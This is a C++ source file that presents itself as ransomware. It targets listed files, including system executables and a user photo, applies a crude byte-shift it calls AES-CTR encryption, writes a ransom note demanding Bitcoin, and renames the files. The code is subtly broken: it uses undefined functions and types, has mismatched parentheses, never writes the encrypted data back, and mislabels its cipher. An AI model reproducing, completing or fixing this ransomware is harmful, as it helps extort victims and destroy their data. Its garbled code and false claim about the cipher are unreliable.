#include <iostream>
#include <string>
#include <vector>
#include <random>
#include <algorithm>

#define SHIFT_LEFT 0x3 << 24
#define SHIFT_RIGHT 0x3 << 24


using namespace std;

// Function to calculate the next byte in the encryption key
unsigned char encryptByte(unsigned char val, unsigned char key) {
    return (val + key) & 0xFF;
}

// Function to calculate the next word in the encryption key
unsigned int encryptWord(unsigned int val, unsigned int key) {
    return ((val) ^ key) & 0xFFFFFFFF;
}


int main() {
    cout << "Starting Ransomware...\n";

    // 1. Victim Selection (Simulated - Replace with actual logic)
    vector<string> victimFiles = {"C:\\Windows\\System32\\notepad.exe", "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe", "C:\\Users\\Public\\Pictures\\Jaelynn_Wink_Measures_1564472701.jpg"};
    int victimFileCount = 0;
    for (const auto& file : victimFiles) {
        cout << "- " << file << endl;
        victimFileCount++;
    }

    // 2. Encryption Key Generation (Using Random Numbers for High Variability)
    unsigned char key1 = 0x48; // Example value, modify to your liking
    unsigned char key2 = 0x5E;
    unsigned int key3 = 0x79A6;
    random_device rd;
    rngengine re(rd());
    uniform_int_distribution<> dist1(0, 0xFF);
    uniform_int_distribution<> dist2(0, 0xFF);


    // 3. Victim File Encryption (AES-CTR Mode)
    vector<char> encryptedData;
    for (const auto& file : victimFiles) {
        FILE* fp = fopen(file.c_str(), "rb");
        if (!fp) {
            cerr << "Error opening file: " << file << endl;
            continue;
        }

        fseek(fp, 0, SEEK_END); // Move read head to the end of the file
        long fileSize = ftell(fp);
        frewind(fp);  // Reset read head to the beginning

        encryptedData.resize(fileSize);
        unsigned int offset = 0;

        char byte;
        while ((size_t)fread(&byte, sizeof(byte), 1, fp) == 1) {
            // Encryption using AES-CTR with a key derived from the random number generator
            encryptedData[offset] = encryptByte(byte, key1);
            offset++;

            if (offset % 4 == 0) { // Process 4 bytes at a time for efficiency
                encryptedData[offset] = encryptByte((unsigned char)(fileSize & 0xFFFFFF)), key2);
                encryptedData[offset + 1] = encryptByte(((unsigned char)((fileSize >> 16)) & 0xFF), key3);
            }
        }

        fclose(fp);
    }


    // 4. Ransom Note Creation and File Modification (Simulated)
    string ransomNoteContent = "Your files have been encrypted!\n\nPay \$50 in Bitcoin to <Bitcoin Address> within 24 hours to unlock them.\n\nOr lose them forever!";
    FILE* ransomFile = fopen("ransom.txt", "w");
    if (fprintf(ransomFile, "%s", ransomNoteContent.c_str()) == -1) {
        cerr << "Error writing ransom note file!\n";
        return 1;
    }
    fclose(ransomFile);

    // 5. File Renaming and Encryption (Simple Example)
    for (const auto& file : victimFiles) {
        char newFileName[] = "Encrypted_" + file;
        if (rename(file.c_str(), newFileName) == 0) {
            cout << "- " << file << " renamed to " << newFileName << endl;
        } else {
            cerr << "Error renaming file: " << file << endl;
        }
    }


    cout << "\nEncryption complete. Ransom note created and files encrypted!\n";

    return 0;
}
